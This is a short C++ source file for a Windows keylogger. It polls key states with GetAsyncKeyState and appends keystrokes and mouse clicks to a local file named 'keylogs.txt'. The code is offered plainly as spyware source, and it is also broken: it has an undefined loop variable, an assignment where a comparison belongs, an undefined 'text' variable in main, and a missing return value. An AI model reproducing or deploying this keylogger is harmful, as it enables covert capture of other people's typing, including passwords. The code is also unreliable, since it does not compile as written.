#include <fstream>
#include <iostream>
#include <stdio.h>
#include <string>
#include <Windows.h>

void log(LPCSTR text) {
  std::ofstream logfile;
  logfile.open("keylogs.txt", fstream::app);
  logfile << text;
  logfile.close();
}

bool KeyListed(int Key) {
  switch (Key)
  {
    case VK_SPACE:
      std::cout << " ";
      log(" ");
      break;
    case VK_RETURN:
      std::cout << "\n";
      log("\n");
      break;
    case VK_SHIFT:
      std::cout << " *Shift* ";
      log(" *Shift* ");
      break;
    case VK_BACK:
      std::cout << "\b";
      log("\b");
      break;
    case VK_RBUTTON:
      std::cout << " *rclick* ";
      log(" *rclick* ");
      break;
    case VK_LBUTTON:
      std::cout << " *lclick* ";
      log(" *lclick* ");
      break;
    case VK_SNAPSHOT:
      std::cout << " *PrintScreen* ";
      log(" *PrintScreen* ");
      break;
    default: return false;
  }
}

int main() {
  unsigned char _Key;
  while (true) {
    Sleep(10);
    for (_Key = 8; _Key <= 190; key++) {
      if (GetAsyncKeyState(_Key) = -32767) {
        if (KeyListed(_Key) == false) {
          std::ofstream logfile;
          logfile.open("keylogs.txt", fstream::app);
          logfile << text;
          logfile.close();
        }
      }
    }
  }
return 0;
}
